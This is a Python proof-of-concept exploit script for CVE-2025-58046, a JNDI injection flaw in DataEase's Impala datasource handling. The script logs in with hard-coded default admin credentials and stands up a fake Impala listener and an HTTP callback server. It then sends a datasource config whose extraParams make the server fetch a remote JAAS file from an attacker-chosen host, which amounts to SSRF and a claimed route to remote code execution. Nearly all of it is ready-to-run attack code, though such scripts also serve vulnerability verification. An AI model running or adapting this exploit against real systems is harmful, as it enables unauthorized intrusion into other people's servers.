#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : DataEase Impala JNDI Injection — Vector 2 (extraParams)
# CVE            : CVE-2025-58046
# Vendor         : DataEase / fit2cloud
# Product        : DataEase
# Affected       : All versions <= 2.10.12
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 9.8 (Critical)
# Platform       : Java / Spring Boot
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-09-15
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC for CVE-2025-58046 — VECTOR 2: Hostname mode with unvalidated extraParams

This is the SECOND attack vector for CVE-2025-58046. While the primary vector uses
urlType="jdbcUrl" to completely bypass the blocklist, this vector demonstrates that
the hostname mode (urlType="hostName") is ALSO vulnerable because extraParams are
injected directly into the JDBC URL without any validation against illegalParameters.

ATTACK CHAIN:
  1. Authenticate to DataEase using default credentials
  2. Send Impala datasource config with urlType="hostName" and krbJAASFile in extraParams
  3. Impala.getJdbc() concatenates extraParams into JDBC URL without blocklist check
  4. Impala JDBC driver fetches the remote JAAS config file (SSRF)
  5. JAAS config triggers JNDI lookup → RCE

PREREQUISITES:
  - DataEase <= 2.10.12 running and accessible
  - Default credentials or valid admin credentials
  - pycryptodome package (pip install pycryptodome)

REFERENCES:
  - CVE-2025-58046
  - https://github.com/dataease/dataease/security/advisories/GHSA-mvwc-x8x9-46c3
"""

import sys
import json
import base64
import socket
import threading
import time
import urllib.request
import urllib.error
from http.server import HTTPServer, BaseHTTPRequestHandler

# ---- Configuration ----
DEFAULT_TARGET_HOST = "172.25.0.3"
DEFAULT_TARGET_PORT = 8100
DEFAULT_CALLBACK_HOST = "172.25.0.4"
DE_USERNAME = "admin"
DE_PASSWORD = "DataEase@123456"
HTTP_CALLBACK_PORT = 8889   # Different port from Vector 1 to avoid conflicts
CALLBACK_WAIT_TIMEOUT = 30
HTTP_TIMEOUT = 15

# ---- Crypto helpers (same as poc.py) ----

def decrypt_aes_key_and_pubkey(dekey_response):
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad

    separator = "LXBrX3NlcGFyYXRvci0="
    parts = dekey_response.split(separator)
    if len(parts) != 2:
        raise ValueError(f"Expected 2 parts, got {len(parts)}")

    encrypted_pubkey_b64 = parts[0]
    aes_key_str = parts[1]
    aes_key = aes_key_str.encode('utf-8')[:16]
    iv = b'0000000000000000'
    encrypted_pubkey = base64.b64decode(encrypted_pubkey_b64)
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(encrypted_pubkey), AES.block_size)
    return decrypted.decode('utf-8')


def rsa_encrypt(plaintext, pubkey_b64):
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5
    pubkey_der = base64.b64decode(pubkey_b64)
    key = RSA.import_key(pubkey_der)
    cipher = PKCS1_v1_5.new(key)
    encrypted = cipher.encrypt(plaintext.encode('utf-8'))
    return base64.b64encode(encrypted).decode('utf-8')


def http_request(url, data=None, headers=None, method=None):
    if headers is None:
        headers = {}
    if data is not None and isinstance(data, (dict, list)):
        data = json.dumps(data).encode('utf-8')
        headers.setdefault('Content-Type', 'application/json')
    elif data is not None and isinstance(data, str):
        data = data.encode('utf-8')

    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=HTTP_TIMEOUT) as resp:
            body = resp.read().decode('utf-8')
            return json.loads(body) if body else {}
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='replace')
        try:
            return json.loads(body)
        except:
            return {"error": body, "status": e.code}
    except Exception as e:
        return {"error": str(e)}


def authenticate(target_host, target_port):
    base_url = f"http://{target_host}:{target_port}"

    print("[*] Fetching RSA public key from /de2api/dekey...")
    resp = http_request(f"{base_url}/de2api/dekey")
    if resp.get("code") != 0 or "data" not in resp:
        print(f"[-] Failed to get dekey: {resp}")
        return None

    pubkey_b64 = decrypt_aes_key_and_pubkey(resp["data"])
    print(f"[+] RSA public key decrypted")

    enc_username = rsa_encrypt(DE_USERNAME, pubkey_b64)
    enc_password = rsa_encrypt(DE_PASSWORD, pubkey_b64)

    resp = http_request(f"{base_url}/de2api/login/localLogin",
                        data={"name": enc_username, "pwd": enc_password})
    if resp.get("code") != 0 or "data" not in resp:
        print(f"[-] Login failed: {resp}")
        return None

    token = resp["data"].get("token")
    print(f"[+] Authentication successful! Token: {token[:40]}...")
    return token


# ---- Callback tracking ----
callback_received = False
callback_details = {}


class JAASHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global callback_received, callback_details
        client = f"{self.client_address[0]}:{self.client_address[1]}"
        print(f"\n[!] *** HTTP CALLBACK RECEIVED (Vector 2: hostName+extraParams) ***")
        print(f"[!] Client: {client}")
        print(f"[!] Path: {self.path}")
        print(f"[!] User-Agent: {self.headers.get('User-Agent', 'N/A')}")

        callback_received = True
        callback_details = {"client": client, "path": self.path}

        # Serve a minimal JAAS config
        jaas = 'Client {\n  com.sun.security.auth.module.Krb5LoginModule required\n  useTicketCache=true;\n};\n'
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Length', str(len(jaas)))
        self.end_headers()
        self.wfile.write(jaas.encode())

    def log_message(self, format, *args):
        pass


def exploit_vector2(target_host, target_port, callback_host):
    """
    Vector 2: Exploit via hostName mode with extraParams injection.

    Instead of providing a full malicious JDBC URL, this vector uses the
    "hostName" urlType and injects krbJAASFile via the extraParams field.
    The extraParams are appended directly to the constructed JDBC URL without
    any validation against the illegalParameters blocklist.
    """
    global callback_received, callback_details
    callback_received = False
    callback_details = {}

    print("=" * 70)
    print(f"  CVE-2025-58046 PoC — VECTOR 2: hostName + extraParams injection")
    print(f"  Target:   {target_host}:{target_port}")
    print(f"  Callback: {callback_host}:{HTTP_CALLBACK_PORT}")
    print("=" * 70)

    # Authenticate
    print(f"\n[*] PHASE 1: Authentication")
    token = authenticate(target_host, target_port)
    if not token:
        print("[-] FAILED: Authentication failed")
        return False

    # Start fake Impala TCP listener (driver needs TCP connect before krbJAASFile fetch)
    print(f"\n[*] PHASE 2: Starting callback servers")
    fake_impala_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    fake_impala_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    fake_impala_sock.settimeout(CALLBACK_WAIT_TIMEOUT + 10)
    fake_impala_sock.bind(('0.0.0.0', 21050))
    fake_impala_sock.listen(5)

    def impala_listener():
        try:
            while True:
                try:
                    conn, addr = fake_impala_sock.accept()
                    print(f"[*] Fake Impala: connection from {addr[0]}:{addr[1]}")
                    conn.settimeout(15)
                    try:
                        data = conn.recv(4096)
                        if data:
                            print(f"[*] Fake Impala: received {len(data)} bytes")
                            time.sleep(10)
                    except (socket.timeout, Exception):
                        pass
                    finally:
                        try:
                            conn.close()
                        except:
                            pass
                except socket.timeout:
                    break
                except:
                    break
        finally:
            fake_impala_sock.close()

    impala_thread = threading.Thread(target=impala_listener, daemon=True)
    impala_thread.start()
    print(f"[+] Fake Impala TCP server started on 0.0.0.0:21050")

    # Start HTTP callback server
    server = HTTPServer(('0.0.0.0', HTTP_CALLBACK_PORT), JAASHandler)
    http_thread = threading.Thread(target=server.serve_forever, daemon=True)
    http_thread.start()
    print(f"[+] HTTP callback server started on port {HTTP_CALLBACK_PORT}")
    time.sleep(0.5)

    # Construct Vector 2 payload: hostName mode with extraParams
    # The JDBC URL will be constructed as:
    #   jdbc:impala://HOST:PORT/DATABASE;EXTRA_PARAMS
    # where EXTRA_PARAMS contains krbJAASFile pointing to our HTTP server
    print(f"\n[*] PHASE 3: Sending exploit payload (hostName + extraParams)")

    jaas_url = f"http://{callback_host}:{HTTP_CALLBACK_PORT}/vector2_jaas.conf"

    # The extraParams field is injected directly into the URL
    # callback_host is used as the Impala host so the JDBC driver can TCP-connect
    # (our machine won't have a fake Impala on 21050 for this test, but the
    # krbJAASFile fetch may happen before or during the connection attempt)
    config = {
        "urlType": "hostName",
        "host": callback_host,       # Point to our IP for TCP connectivity
        "port": 21050,
        "dataBase": "default",
        "extraParams": (
            f"AuthMech=1;"
            f"KrbRealm=EXPLOIT.LOCAL;"
            f"KrbHostFQDN=impala.exploit.local;"
            f"KrbServiceName=impala;"
            f"krbJAASFile={jaas_url}"
        ),
        "username": "",
        "password": ""
    }

    config_json = json.dumps(config)
    config_b64 = base64.b64encode(config_json.encode('utf-8')).decode('utf-8')

    print(f"[*] Configuration (plaintext): {config_json}")
    print(f"[*] extraParams: {config['extraParams']}")
    print(f"[*] Expected JDBC URL: jdbc:impala://{callback_host}:21050/default;{config['extraParams']}")

    payload = {
        "name": "poc-impala-vector2",
        "type": "impala",
        "configuration": config_b64
    }

    base_url = f"http://{target_host}:{target_port}"
    resp = http_request(
        f"{base_url}/de2api/datasource/validate",
        data=payload,
        headers={"Content-Type": "application/json", "X-DE-TOKEN": token}
    )
    print(f"[*] Server response: {json.dumps(resp, indent=2)}")

    # Wait for callback
    print(f"\n[*] PHASE 4: Waiting for callback ({CALLBACK_WAIT_TIMEOUT}s timeout)...")
    start = time.time()
    while time.time() - start < CALLBACK_WAIT_TIMEOUT:
        if callback_received:
            break
        time.sleep(0.5)

    # Results
    print(f"\n{'='*70}")
    if callback_received:
        print("  [+] VECTOR 2 CONFIRMED — hostName + extraParams injection works!")
        print(f"  [+] HTTP callback from: {callback_details.get('client', 'unknown')}")
        print(f"  [+] Requested path: {callback_details.get('path', 'unknown')}")
        print()
        print("  This proves that even when using urlType='hostName',")
        print("  the extraParams field is injected into the JDBC URL without")
        print("  validation against the illegalParameters blocklist.")
        print("  The krbJAASFile parameter triggers remote JAAS config fetch (SSRF).")
    else:
        print("  [-] VECTOR 2 NOT CONFIRMED — no callback received")
        print("  [-] The hostName mode may require the TCP connection to succeed first.")
        print("  [-] Note: This vector may need a fake Impala TCP server for the driver")
        print("  [-] to proceed to the Kerberos auth stage where krbJAASFile is loaded.")

        error_msg = resp.get("msg", "")
        if error_msg:
            print(f"  [-] Server error: {error_msg[:200]}")
    print(f"{'='*70}\n")

    server.shutdown()
    return callback_received


if __name__ == '__main__':
    target_host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET_HOST
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_TARGET_PORT
    callback_host = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_CALLBACK_HOST

    success = exploit_vector2(target_host, target_port, callback_host)
    sys.exit(0 if success else 1)
